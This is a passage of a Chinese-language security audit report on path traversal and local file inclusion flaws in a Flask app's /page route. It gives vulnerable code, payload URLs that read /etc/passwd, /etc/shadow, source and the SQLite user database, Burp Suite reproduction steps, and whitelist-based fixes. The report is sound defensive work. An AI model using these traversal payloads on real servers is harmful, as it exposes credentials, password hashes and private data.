## 三、漏洞详细分析

### LFI-01 路径遍历 — 任意文件读取

#### 漏洞描述

动态页面加载接口通过 URL 参数 `name` 指定要加载的页面文件，但服务端直接将用户输入拼接到文件路径中，**未对路径遍历符号 `../` 做任何过滤**。攻击者可通过 `../` 跳出 `pages/` 目录，读取服务器上的任意文件。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`GET /page`
- **代码行号**：修复前第 416、422 行

#### 漏洞代码（修复前）

```python
name = request.args.get("name", "")                    # 用户完全控制
page_path = os.path.join("pages", name)                 # 直接拼接，无../过滤
# os.path.join("pages", "../app.py") → "app.py"
# os.path.join("pages", "../../etc/passwd") → "../../etc/passwd"
```

#### 漏洞可利用的 Payload

```url
/page?name=../app.py                    → 读取 Flask 应用源码
/page?name=../templates/base.html       → 读取模板文件
/page?name=../data/users.db             → 下载 SQLite 数据库
/page?name=../../etc/passwd             → 读取系统账户文件
/page?name=../../etc/shadow             → 读取密码哈希（root权限）
/page?name=../../.git/config            → 读取 Git 仓库配置
/page?name=../static/uploads/shell.php  → 访问上传的 Webshell
```

#### 复现步骤（Burp Suite）

```

步骤 1：打开 Burp Suite，访问目标站点
──────────────────────────────────────────────────────────────────
步骤 2：发送 GET 请求读取 Flask 应用源码

        GET /page?name=../app.py HTTP/1.1
        Host: 127.0.0.1:5000

        服务器处理：os.path.join("pages", "../app.py") = "app.py"
──────────────────────────────────────────────────────────────────
步骤 3：查看响应内容

        响应页面中直接显示了 app.py 的完整源码
        ⚠️ 后端代码完全暴露
──────────────────────────────────────────────────────────────────
步骤 4：进一步读取系统文件

        GET /page?name=../../etc/passwd HTTP/1.1
        Host: 127.0.0.1:5000

        响应内容：
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        ...
──────────────────────────────────────────────────────────────────
步骤 5：下载数据库文件

        GET /page?name=../data/users.db HTTP/1.1
        Host: 127.0.0.1:5000

        ⚠️ SQLite 数据库文件被下载，用户名密码哈希值泄露

```

|-------------|----------|:----:|:----:|
| `/page?name=help` | pages/help.html（正常） | 显示帮助页面 | ✅ 正常 |
| `/page?name=../app.py` | app.py（源码） | 拒绝访问 | ❌ 读取成功 |
| `/page?name=../data/users.db` | users.db（数据库） | 拒绝访问 | ❌ 读取成功 |
| `/page?name=../../etc/passwd` | /etc/passwd（系统文件） | 拒绝访问 | ❌ 读取成功 |

#### 可能造成的危害

- 应用后端源码完全泄露，攻击者可分析代码寻找更多漏洞
- 数据库文件被下载，用户数据泄露
- 系统配置文件泄露（如 `/etc/passwd`），辅助提权攻击
- 配合文件上传漏洞，可激活已上传的 Webshell

### LFI-02 本地文件包含 — 任意文件内容回显

#### 漏洞描述

被读取的文件内容通过 `{{ page_content | safe }}` 直接渲染到页面中，没有任何限制。同时代码做了**自动补 `.html` 后缀**的逻辑，文件查找存在两重尝试，扩大了可读取的文件范围。

#### 漏洞位置

- **文件**：`app.py`
- **路由**：`GET /page`
- **代码行号**：修复前第 427-437 行

#### 漏洞代码（修复前）

```python
# 第一重：直接查找 pages/name
if os.path.exists(page_path):
    with open(page_path, "r", encoding="utf-8") as f:
        content = f.read()                     # 内容直接回显
else:
    # 第二重：找不到则自动加 .html 后缀
    page_path_html = page_path + ".html"
    if os.path.exists(page_path_html):
        with open(page_path_html, "r", encoding="utf-8") as f:
            content = f.read()
```

#### 漏洞可利用的 Payload

```url
# 通过自动补 .html 后缀扩大读取范围
/page?name=../templates/index     → 补.html后读取 index.html
/page?name=../app                  → 补.html后尝试 app.html（可能不存在）
```

#### 复现步骤（Burp Suite）

```
──────────────────────────────────────────────────────────────────
步骤 1：直接读取 .py 文件（第一重匹配）
        GET /page?name=../app.py
        响应：返回 app.py 完整源码 ✅
──────────────────────────────────────────────────────────────────
步骤 2：读取 .html 文件（第一重匹配）
        GET /page?name=../templates/base.html
        响应：返回 base.html 完整源码 ✅
──────────────────────────────────────────────────────────────────
步骤 3：利用自动补后缀读取（第二重匹配）
        GET /page?name=../templates/index
        → 第一重 pages/../templates/index 不存在
        → 第二重 pages/../templates/index.html 存在 → 返回内容 ✅
──────────────────────────────────────────────────────────────────
步骤 4：尝试读取系统文件
        GET /page?name=../../etc/passwd
        响应：返回 /etc/passwd 内容 ✅
──────────────────────────────────────────────────────────────────
```

#### 可能造成的危害

- 任意扩展名的文本文件均可被读取并回显
- 两重文件查找逻辑增加了可利用的文件范围
- 模板文件泄露可暴露页面结构和注释中的敏感信息

## 四、修复方案

### 4.1 修复策略总览

本次修复采用 **路径遍历过滤 + 白名单校验 + 固定后缀** 三层防御策略：

| 漏洞编号 | 修复策略 | 具体措施 |
|----------|----------|----------|
| LFI-01 | 路径遍历过滤 | 拦截包含 `../`、`/`、`\` 的请求 |
| LFI-01 | 白名单校验 | 仅允许预设的页面名称 |
| LFI-02 | 固定后缀 | 禁止用户控制后缀，统一使用 `.html` |

### 4.2 各漏洞详细修复

#### LFI-01 修复：路径遍历过滤 + 白名单校验

**修复原理**：第一层过滤 `../` 等路径遍历符号，第二层通过白名单验证页面名称是否在允许列表中，双重防护确保无法读取任意文件。

```python
# 【修复前】直接拼接用户输入，无过滤
name = request.args.get("name", "")
page_path = os.path.join("pages", name)
with open(page_path, "r") as f:
    content = f.read()

# 【修复后】三层防护
# 第一层：过滤路径遍历符号
if ".." in name or "/" in name or "\\" in name:
    return render_template("index.html", page_content="页面不存在")

# 第二层：白名单校验
ALLOWED_PAGES = {"help", "about", "contact", "faq"}
if name not in ALLOWED_PAGES:
    return render_template("index.html", page_content="页面不存在")

# 第三层：固定后缀，禁止用户控制
page_path = os.path.join("pages", name + ".html")
```

#### LFI-02 修复：固定后缀 + 禁用双查找

**修复原理**：统一使用 `.html` 后缀，取消用户对文件扩展名的控制权，同时取消两重文件查找逻辑，只做一次精确查找。

```python
# 【修复前】两重查找，自动补后缀
if os.path.exists(page_path):
    with open(page_path, "r") as f:
        content = f.read()
else:
    page_path_html = page_path + ".html"
    if os.path.exists(page_path_html):
        with open(page_path_html, "r") as f:
            content = f.read()

# 【修复后】统一后缀 + 单次精确查找
page_path = os.path.join("pages", name + ".html")
if os.path.exists(page_path):
    with open(page_path, "r", encoding="utf-8") as f:
        content = f.read()
else:
    content = "页面不存在"
```

### 4.3 修复前后代码对比

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 路径遍历过滤 | ❌ 无 | ✅ 拦截 `../`、`/`、`\` |
| 页面名称校验 | ❌ 无 | ✅ 白名单限制 |
| 文件后缀控制 | ❌ 用户可控 | ✅ 固定 `.html` |
| 文件查找次数 | 两重（自动补后缀） | 单次精确查找 |

## 六、总结与建议

### 6.1 修复成果

本次文件包含安全专项审计共发现 **2 项漏洞**（均为高危），已全部完成修复。经过 Burp Suite 验证，所有路径遍历和文件读取攻击均被有效拦截，系统目前处于安全状态。

### 6.2 根本原因分析

| 问题根源 | 说明 | 涉及漏洞 |
|----------|------|----------|
| **信任用户输入** | 未对 `name` 参数进行任何过滤直接拼接入路径 | LFI-01 |
| **缺少访问控制** | 未限制可读取的文件范围和白名单 | LFI-01, LFI-02 |
| **用户可控后缀** | 用户可通过输入控制文件扩展名 | LFI-02 |

### 6.3 安全编码建议

在开发文件读取和页面加载功能时，请务必遵循以下原则：

1. **永远不要信任用户输入的文件路径**
   - 过滤 `../`、`/`、`\` 等路径遍历符号
   - 使用 `os.path.basename()` 提取纯粹文件名

2. **使用白名单限制可访问的文件**
   - 预设允许的文件名称列表
   - 不在白名单中的请求一律拒绝

3. **禁止用户控制文件后缀**
   - 服务端统一指定文件后缀
   - 不允许用户通过参数指定 `.py`、`.db` 等非预期后缀

4. **使用真实路径校验**
   - 用 `os.path.realpath()` 规范化路径后校验前缀
   - 确保最终路径仍在预期的目录范围内

### 6.4 后续优化建议

| 优先级 | 建议项 | 说明 |
|--------|--------|------|
| 🟡 中 | 添加 `@login_required` | 页面加载接口增加登录限制 |
| 🟢 低 | 改用模板渲染 | 将页面内容改为 Flask 模板继承，而非直接读取文件 |
| 🟢 低 | 添加文件类型校验 | 统一仅允许 `.html` 文件被加载 |
